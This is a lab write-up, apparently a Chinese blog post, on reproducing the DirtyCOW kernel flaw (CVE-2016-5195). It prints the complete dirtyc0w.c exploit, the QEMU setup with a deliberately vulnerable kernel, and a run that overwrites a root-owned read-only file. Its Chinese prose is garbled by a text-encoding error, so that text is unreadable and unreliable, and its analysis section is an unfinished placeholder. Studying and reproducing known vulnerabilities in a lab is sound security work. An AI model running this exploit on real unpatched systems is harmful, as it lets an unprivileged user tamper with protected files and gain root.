---
title: "CVE-2016-5195 Linux DirtyCOWæ¼æ´åˆ†æ"
description: "ç»å…¸çš„å†…æ ¸ææƒæ¼æ´"
date: 2022-05-24T17:43:25+08:00
categories: "æ¼æ´åˆ†æ"
tags: [ "Kernel" ]
image: https://s2.loli.net/2022/05/24/JFAS5mGpYn9utWi.jpg
---



## èƒŒæ™¯çŸ¥è¯†

### DirtyCOW

- [https://dirtycow.ninja/](https://dirtycow.ninja/)
- [https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
- [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

### Copy on Write

- [https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html](https://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html)
- [https://blog.csdn.net/puliao4167/article/details/87894191](https://blog.csdn.net/puliao4167/article/details/87894191)

### Page Cache

- [https://en.wikipedia.org/wiki/Page_cache](https://en.wikipedia.org/wiki/Page_cache)

### mmap

- [https://www.cnblogs.com/huxiao-tee/p/4660352.html](https://www.cnblogs.com/huxiao-tee/p/4660352.html)

### å†…æ ¸æ–‡ä»¶ç³»ç»Ÿ

- [https://www.cnblogs.com/huxiao-tee/p/4657851.html](https://www.cnblogs.com/huxiao-tee/p/4657851.html)

### æ¡ä»¶ç«äº‰

- [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/race-condition/introduction-zh/)



## ç¯å¢ƒå‡†å¤‡

### Linux Kernel

#### ç›´æ¥ä¸‹è½½

é€‰å–ä¸€ä¸ªæœ‰æ¼æ´çš„ç‰ˆæœ¬4.4.0ï¼Œä¸‹è½½ubuntuå¯¹åº”çš„debåŒ…ã€‚è§£å‹å¾—åˆ°`./boot/vmlinuz-4.4.0-31-generic`

```sh
wget http://security.ubuntu.com/ubuntu/pool/main/l/linux/linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
ar xv linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
tar jxvf data.tar.bz2
```

ç¼ºç‚¹æ˜¯ç”±æ­¤å¾—åˆ°çš„bootable kernelä¸­ä¸åŒ…å«è°ƒè¯•ä¿¡æ¯ã€‚

#### è‡ªè¡Œç¼–è¯‘

è·å–Linux Kernelæºç ä»“åº“å¹¶åˆ‡æ¢åˆ°ä¸€ä¸ªæœ‰æ¼æ´çš„ç‰ˆæœ¬4.4ï¼š

```sh
git clone https://mirrors.tuna.tsinghua.edu.cn/git/linux.git
cd linux
git checkout v4.4
```

è½½å…¥x86_64çš„é»˜è®¤é…ç½®ï¼š

```sh
make x86_64_defconfig
```

ä½¿ç”¨Linuxæä¾›çš„è„šæœ¬ä¸€é”®å¯ç”¨DEBUG_KERNELã€DEBUG_INFOã€KGDBã€GDB_SCRIPTSï¼Œå…³é—­RANDOMIZE_BASEï¼ˆkaslrï¼‰

```sh
./scripts/config --file .config -e DEBUG_KERNEL -e DEBUG_INFO -e GDB_SCRIPTS -e KGDB -d RANDOMIZE_BASE
```

ç”±äºæ˜¯æ—§ç‰ˆkernelï¼Œéœ€åœ¨è€ç¯å¢ƒä¸­ç¼–è¯‘ã€‚é‡‡ç”¨dockeråˆ›å»ºubuntu16.04çš„ç¼–è¯‘ç¯å¢ƒï¼š

```sh
sudo docker run -it --rm -v /home/zkv/Laboratory/dirtycow/linux:/linux ubuntu:16.04 /bin/bash
```

äºè¯¥containerä¸­å‡†å¤‡ç¼–è¯‘ç¯å¢ƒå¹¶ç¼–è¯‘ï¼š

```sh
apt update; apt install -y apt-transport-https
cat > /etc/apt/sources.list << EOF
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse
EOF
apt update; apt upgrade -y
apt install gcc make bc
cd /linux
make -j`nproc`
```

å³å¾—åˆ°bootable kernelã€‚

### PoC

ä»[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)é€‰å–dirtyc0w.cï¼š

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

ç¼–è¯‘PoCï¼š

```sh
gcc -static -pthread dirtyc0w.c -o dirtyc0w
```

### rootfs

è¿™é‡Œé‡‡ç”¨busyboxæ‰‹åŠ¨æ„å»ºã€‚å…‹éš†busyboxæºç ä»“åº“ï¼Œè¿›è¡Œmenuconfigé…ç½®ï¼š

```sh
git clone https://git.busybox.net/busybox/
cd busybox
make menuconfig
```

Setttings é€‰ä¸­ Build static binary (no shared libs)ï¼Œè¿›è¡Œæˆé™æ€é“¾æ¥æ„å»ºã€‚

æ­¤åä½¿ç”¨`make install`ï¼Œç”Ÿæˆ`_install`ç›®å½•ï¼Œå†…å«å¯è¢«å½“ä½œæ ¹æ–‡ä»¶æ ‘ä½¿ç”¨çš„å®‰è£…æ–‡ä»¶ã€‚

æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®šåˆ¶ç¨åçš„rootfsã€‚å…ˆæ¥åˆ°`_install`åˆ›å»ºå¿…è¦çš„ç›®å½•å’Œæ–‡ä»¶ï¼š

```sh
cd _install
mkdir -p proc sys dev etc/init.d
mkdir home root
echo "root::0:0:root:/root:/bin/sh" > etc/passwd
# æ­¤å¤„å°†root:x:0:0:root:/root:/bin/shä¸­çš„xåˆ é™¤å³å¯æ— å¯†ç ç™»é™†root
echo "root:x:0:" > etc/group
```

ç¼–å†™initè„šæœ¬ï¼š

```sh
cat > ./init << EOF
#!/bin/sh
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
setsid /bin/cttyhack setuidgid 1000 /bin/sh
EOF
chmod +x ./init
```

ç”±äºç±»ä¼¼tarã€cpioçš„å½’æ¡£ç¨‹åºä¼šå°†æ–‡ä»¶çš„inodeä¸€åŒæ‰“åŒ…ï¼Œæ•…hostæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æ‰€å±ã€æƒé™ç­‰ä¿¡æ¯ä¹Ÿä¼šå‘ˆç°åœ¨qemu guestä¸­ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€å…ˆä¸ºbusyboxè¿›è¡Œå¿…è¦çš„æƒé™è°ƒæ•´ï¼š

```sh
sudo chown root:root busybox/_install/bin/busybox
sudo chmod u+s busybox/_install/bin/busybox
```

å°†PoCåŠ å…¥åï¼Œæ‰“åŒ…cpioæ ¼å¼çš„initramfsï¼š

```sh
cp dirtyc0w busybox/_install/bin
cd busybox/_install
find . | cpio -o --format=newc > ../../rootfs.img
# è§£åŒ…å‘½ä»¤
# cpio -idmv < rootfs.img
```

rootfså³å‡†å¤‡å®Œæ¯•ã€‚

## æ¼æ´å¤ç°

ä¸Šä¸€æ­¥å·²ç»å¾—åˆ°äº†ï¼š

- å¸¦è°ƒè¯•ä¿¡æ¯çš„Linux Kernelï¼šbzImage
- åŒ…å«äº†PoCçš„æ–‡ä»¶ç³»ç»Ÿinitramfsé•œåƒï¼šrootfs.img

æˆ‘ä»¬ä½¿ç”¨qemuå°†å…¶å¯åŠ¨ï¼š

```sh
qemu-system-x86_64 \
  -kernel bzImage \
  -initrd rootfs.img \
  -append "console=ttyS0" \
  -nographic
```

è¿›å…¥qemu gueståï¼š

```sh
~ $ id
uid=1000 gid=1000 groups=1000
~ $ ls -l /bin/dirtyc0w
-rwxrwxr-x    1 1000     1000       1023952 Aug 18 08:00 /bin/dirtyc0w
~ $ su
/ # echo nothing > foo
/ # chmod 0404 foo
/ # ls -lah foo
-r-----r--    1 root     root          16 Aug 18 08:48 foo
/ # ^D
~ $ cat foo
nothing
~ $ dirtyc0w foo hacked!!!
mmap 7fd5597c8000
^C
~ $ cat foo
hacked!!!
```

è‡³æ­¤æ¼æ´æˆåŠŸå¤ç°ï¼ğŸ¥³

## æ¼æ´åˆ†æ

Waiting 

https://xz.aliyun.com/t/7561



